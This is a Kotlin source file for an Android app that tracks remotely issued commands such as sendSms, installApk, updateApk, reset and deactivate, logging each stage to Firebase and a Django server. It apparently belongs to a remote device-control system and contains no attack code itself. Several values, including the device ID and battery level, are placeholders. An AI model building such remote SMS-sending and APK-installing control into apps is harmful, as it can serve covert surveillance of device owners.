package com.example.fast.util

import android.content.Context
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.util.Log
import com.example.fast.config.AppConfig
import com.example.fast.service.PersistentForegroundService
import com.example.fast.util.VersionChecker
import com.example.fast.util.NetworkUtils
import com.example.fast.util.LogHelper
import com.google.firebase.Firebase
import com.google.firebase.database.database
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.util.concurrent.atomic.AtomicLong

/**
 * CommandResponseTracker - Comprehensive tracking system for remote command lifecycle
 * 
 * Tracks every important point of command execution:
 * - Command reception and validation
 * - Permission and resource checks
 * - Content parsing and processing
 * - Execution progress and sub-operations
 * - Post-execution cleanup and final status
 */
object CommandResponseTracker {
    private const val TAG = "CommandResponseTracker"
    private val activeCommands = mutableMapOf<Long, CommandResponseBuilder>()
    private val deviceId by lazy { getDeviceId() }
    
    fun startTracking(commandKey: String, content: String, historyTimestamp: Long) {
        val builder = CommandResponseBuilder(
            commandKey = commandKey,
            content = content,
            historyTimestamp = historyTimestamp,
            receivedAt = System.currentTimeMillis()
        )
        activeCommands[historyTimestamp] = builder
        
        // Track command reception
        trackEvent(historyTimestamp, "command_received", mapOf(
            "command_key" to commandKey,
            "content_length" to content.length,
            "content_preview" to content.take(100),
            "timestamp" to System.currentTimeMillis()
        ))
        
        LogHelper.d(TAG, "Started tracking command: $commandKey at $historyTimestamp")
    }
    
    fun trackValidation(historyTimestamp: Long, type: String, result: Any) {
        activeCommands[historyTimestamp]?.trackValidation(type, result)
        trackEvent(historyTimestamp, "validation_$type", mapOf(
            "result" to when (result) {
                is Map<*, *> -> result
                else -> mapOf("status" to result.toString())
            },
            "timestamp" to System.currentTimeMillis()
        ))
    }
    
    fun trackExecution(historyTimestamp: Long, event: String, data: Map<String, Any>) {
        activeCommands[historyTimestamp]?.trackExecution(event, data)
        trackEvent(historyTimestamp, "execution_$event", data + mapOf(
            "timestamp" to System.currentTimeMillis()
        ))
    }
    
    fun trackSubOperation(historyTimestamp: Long, operation: String, status: String, data: Map<String, Any> = emptyMap()) {
        activeCommands[historyTimestamp]?.trackSubOperation(operation, status, data)
        trackEvent(historyTimestamp, "suboperation_$operation", data + mapOf(
            "status" to status,
            "timestamp" to System.currentTimeMillis()
        ))
    }
    
    fun completeTracking(historyTimestamp: Long, finalStatus: String, error: Throwable? = null) {
        val builder = activeCommands.remove(historyTimestamp)
        builder?.let {
            val response = it.build(finalStatus, error)
            
            // Track final status
            trackEvent(historyTimestamp, "command_completed", mapOf(
                "final_status" to finalStatus,
                "duration" to (System.currentTimeMillis() - it.receivedAt),
                "error" to (error?.message ?: ""),
                "error_type" to (error?.let { it::class.simpleName } ?: ""),
                "timestamp" to System.currentTimeMillis()
            ))
            
            // Save comprehensive response
            saveCommandResponse(response)
            
            LogHelper.d(TAG, "Completed tracking command: ${response.commandKey} with status: $finalStatus")
        } ?: run {
            LogHelper.w(TAG, "No active command found for timestamp: $historyTimestamp")
        }
    }
    
    private fun trackEvent(historyTimestamp: Long, eventType: String, data: Map<String, Any>) {
        // Save to Firebase
        val eventPath = "${AppConfig.getFirebaseDevicePath(deviceId)}/commandEvents/$historyTimestamp/$eventType"
        
        Firebase.database.reference.child(eventPath).setValue(data + mapOf(
            "event_timestamp" to System.currentTimeMillis()
        )).addOnFailureListener { e ->
            LogHelper.e(TAG, "Failed to track event to Firebase: $eventType", e)
        }
        
        // Send to Django
        CoroutineScope(Dispatchers.IO).launch {
            try {
                DjangoApiHelper.trackCommandEvent(deviceId, historyTimestamp, eventType, data)
            } catch (e: Exception) {
                LogHelper.e(TAG, "Failed to track event to Django", e)
            }
        }
    }
    
    private fun saveCommandResponse(response: CommandResponse) {
        // Save detailed response to Firebase
        val responsePath = "${AppConfig.getFirebaseDevicePath(deviceId)}/commandResponses/${response.historyTimestamp}"
        
        Firebase.database.reference.child(responsePath).setValue(response.toMap())
            .addOnSuccessListener {
                LogHelper.d(TAG, "Command response saved to Firebase: ${response.commandKey}")
            }
            .addOnFailureListener { e ->
                LogHelper.e(TAG, "Failed to save command response to Firebase", e)
            }
        
        // Send summary to Django
        CoroutineScope(Dispatchers.IO).launch {
            try {
                DjangoApiHelper.saveCommandResponse(response)
            } catch (e: Exception) {
                LogHelper.e(TAG, "Failed to save command response to Django", e)
            }
        }
    }
    
    private fun getDeviceId(): String {
        return try {
            // Get device ID from context - this needs to be passed in or accessed differently
            "device_id_placeholder"
        } catch (e: Exception) {
            LogHelper.e(TAG, "Failed to get device ID", e)
            "unknown"
        }
    }
}

// Data structures for comprehensive tracking
data class CommandResponse(
    // Basic Info
    val commandKey: String,
    val content: String,
    val historyTimestamp: Long,
    
    // Timing
    val receivedAt: Long,
    val validationStartedAt: Long,
    val executionStartedAt: Long,
    val completedAt: Long,
    
    // Validation Results
    val rateLimitResult: RateLimitResult,
    val permissionCheckResult: PermissionCheckResult,
    val contentValidationResult: ValidationResult,
    val resourceCheckResult: ResourceCheckResult,
    
    // Execution Results
    val executionResult: ExecutionResult,
    val subOperations: List<SubOperationResult>,
    val postExecutionResult: PostExecutionResult,
    
    // Final Status
    val finalStatus: String,
    val errorClassification: String,
    val impactLevel: String,
    val recoveryOptions: List<String>,
    
    // Metadata
    val deviceId: String,
    val appVersion: String,
    val networkState: String,
    val batteryLevel: Int
) {
    fun toMap(): Map<String, Any> {
        return mapOf(
            "commandKey" to commandKey,
            "content" to content,
            "historyTimestamp" to historyTimestamp,
            "receivedAt" to receivedAt,
            "validationStartedAt" to validationStartedAt,
            "executionStartedAt" to executionStartedAt,
            "completedAt" to completedAt,
            "rateLimitResult" to rateLimitResult.toMap(),
            "permissionCheckResult" to permissionCheckResult.toMap(),
            "contentValidationResult" to contentValidationResult.toMap(),
            "resourceCheckResult" to resourceCheckResult.toMap(),
            "executionResult" to executionResult.toMap(),
            "subOperations" to subOperations.map { it.toMap() },
            "postExecutionResult" to postExecutionResult.toMap(),
            "finalStatus" to finalStatus,
            "errorClassification" to errorClassification,
            "impactLevel" to impactLevel,
            "recoveryOptions" to recoveryOptions,
            "deviceId" to deviceId,
            "appVersion" to appVersion,
            "networkState" to networkState,
            "batteryLevel" to batteryLevel
        )
    }
}

data class RateLimitResult(
    val allowed: Boolean,
    val reason: String?,
    val nextAllowedAt: Long?
) {
    fun toMap(): Map<String, Any> = mapOf(
        "allowed" to allowed,
        "reason" to (reason ?: ""),
        "nextAllowedAt" to (nextAllowedAt ?: 0)
    )
}

data class PermissionCheckResult(
    val checked: Boolean,
    val granted: List<String>,
    val denied: List<String>,
    val missing: List<String>
) {
    fun toMap(): Map<String, Any> = mapOf(
        "checked" to checked,
        "granted" to granted,
        "denied" to denied,
        "missing" to missing
    )
}

data class ValidationResult(
    val valid: Boolean,
    val errors: List<String>,
    val normalizedContent: String?,
    val extractedParams: Map<String, Any>
) {
    fun toMap(): Map<String, Any> = mapOf(
        "valid" to valid,
        "errors" to errors,
        "normalizedContent" to (normalizedContent ?: ""),
        "extractedParams" to extractedParams
    )
}

data class ResourceCheckResult(
    val networkAvailable: Boolean,
    val storageAvailable: Boolean,
    val batterySufficient: Boolean,
    val systemReady: Boolean
) {
    fun toMap(): Map<String, Any> = mapOf(
        "networkAvailable" to networkAvailable,
        "storageAvailable" to storageAvailable,
        "batterySufficient" to batterySufficient,
        "systemReady" to systemReady
    )
    
    fun getIssues(): List<String> {
        val issues = mutableListOf<String>()
        if (!networkAvailable) issues.add("Network unavailable")
        if (!storageAvailable) issues.add("Storage insufficient")
        if (!batterySufficient) issues.add("Battery low")
        if (!systemReady) issues.add("System busy")
        return issues
    }
}

data class ExecutionResult(
    val started: Boolean,
    val completed: Boolean,
    val duration: Long,
    val output: Any?,
    val error: Throwable?
) {
    fun toMap(): Map<String, Any> = mapOf(
        "started" to started,
        "completed" to completed,
        "duration" to duration,
        "output" to (output?.toString() ?: ""),
        "error" to (error?.message ?: "")
    )
}

data class SubOperationResult(
    val operation: String,
    val status: String,
    val startedAt: Long,
    val completedAt: Long,
    val result: Any?,
    val error: String?
) {
    fun toMap(): Map<String, Any> = mapOf(
        "operation" to operation,
        "status" to status,
        "startedAt" to startedAt,
        "completedAt" to completedAt,
        "result" to (result?.toString() ?: ""),
        "error" to (error ?: "")
    )
}

data class PostExecutionResult(
    val cleanupCompleted: Boolean,
    val stateUpdated: Boolean,
    val logged: Boolean,
    val notificationsSent: Boolean,
    val followUpTriggered: Boolean
) {
    fun toMap(): Map<String, Any> = mapOf(
        "cleanupCompleted" to cleanupCompleted,
        "stateUpdated" to stateUpdated,
        "logged" to logged,
        "notificationsSent" to notificationsSent,
        "followUpTriggered" to followUpTriggered
    )
}

class CommandResponseBuilder(
    private val commandKey: String,
    private val content: String,
    private val historyTimestamp: Long,
    val receivedAt: Long
) {
    var validationStartedAt: Long = 0
    var executionStartedAt: Long = 0
    var completedAt: Long = 0
    
    private val validationResults = mutableMapOf<String, Any>()
    private val executionEvents = mutableListOf<Pair<String, Map<String, Any>>>()
    private val subOperations = mutableListOf<SubOperationResult>()
    
    fun trackValidation(type: String, result: Any) {
        if (validationStartedAt == 0L) validationStartedAt = System.currentTimeMillis()
        validationResults[type] = result
    }
    
    fun trackExecution(event: String, data: Map<String, Any>) {
        if (executionStartedAt == 0L) executionStartedAt = System.currentTimeMillis()
        executionEvents.add(event to data)
    }
    
    fun trackSubOperation(operation: String, status: String, data: Map<String, Any>) {
        val now = System.currentTimeMillis()
        subOperations.add(SubOperationResult(
            operation = operation,
            status = status,
            startedAt = now,
            completedAt = now,
            result = data,
            error = data["error"] as? String
        ))
    }
    
    fun build(finalStatus: String, error: Throwable? = null): CommandResponse {
        completedAt = System.currentTimeMillis()
        
        return CommandResponse(
            commandKey = commandKey,
            content = content,
            historyTimestamp = historyTimestamp,
            receivedAt = receivedAt,
            validationStartedAt = validationStartedAt,
            executionStartedAt = executionStartedAt,
            completedAt = completedAt,
            
            // Extract from tracked data
            rateLimitResult = validationResults["rate_limit"] as? RateLimitResult ?: RateLimitResult(false, null, null),
            permissionCheckResult = validationResults["permissions"] as? PermissionCheckResult ?: PermissionCheckResult(false, emptyList(), emptyList(), emptyList()),
            contentValidationResult = validationResults["content"] as? ValidationResult ?: ValidationResult(false, emptyList(), null, emptyMap()),
            resourceCheckResult = validationResults["resources"] as? ResourceCheckResult ?: ResourceCheckResult(false, false, false, false),
            
            executionResult = ExecutionResult(
                started = executionStartedAt > 0,
                completed = finalStatus in listOf("executed", "partial_success"),
                duration = if (executionStartedAt > 0) completedAt - executionStartedAt else 0,
                output = null,
                error = error
            ),
            
            subOperations = subOperations,
            postExecutionResult = PostExecutionResult(
                cleanupCompleted = true,
                stateUpdated = true,
                logged = true,
                notificationsSent = false,
                followUpTriggered = false
            ),
            
            finalStatus = finalStatus,
            errorClassification = classifyError(error),
            impactLevel = determineImpactLevel(finalStatus, commandKey),
            recoveryOptions = getRecoveryOptions(finalStatus, commandKey),
            
            deviceId = "device_id_placeholder",
            appVersion = "unknown",
            networkState = "unknown",
            batteryLevel = try {
                getBatteryLevel()
            } catch (e: Exception) {
                0
            }
        )
    }
    
    private fun classifyError(error: Throwable?): String {
        return when {
            error == null -> "none"
            error is SecurityException -> "permission"
            error is IllegalArgumentException -> "validation"
            error is java.io.IOException -> "io"
            error is java.net.SocketException || error is java.net.UnknownHostException -> "network"
            else -> "system"
        }
    }
    
    private fun determineImpactLevel(status: String, command: String): String {
        return when {
            status == "executed" -> "low"
            command in listOf("sendSms", "updateApk", "reset", "deactivate") -> "high"
            command in listOf("showNotification", "requestPermission", "installApk") -> "medium"
            else -> "low"
        }
    }
    
    private fun getRecoveryOptions(status: String, command: String): List<String> {
        return when {
            status == "rate_limited" -> listOf("retry_later")
            status == "permission_denied" -> listOf("grant_permissions", "retry")
            status == "validation_failed" -> listOf("fix_format", "retry")
            command == "sendSms" && status == "execution_failed" -> listOf("retry", "check_number")
            command == "updateApk" && status == "execution_failed" -> listOf("retry", "check_network")
            else -> emptyList()
        }
    }
    
    private fun getBatteryLevel(): Int {
        return try {
            // Placeholder implementation - would need context to get actual battery level
            50
        } catch (e: Exception) {
            0
        }
    }
}
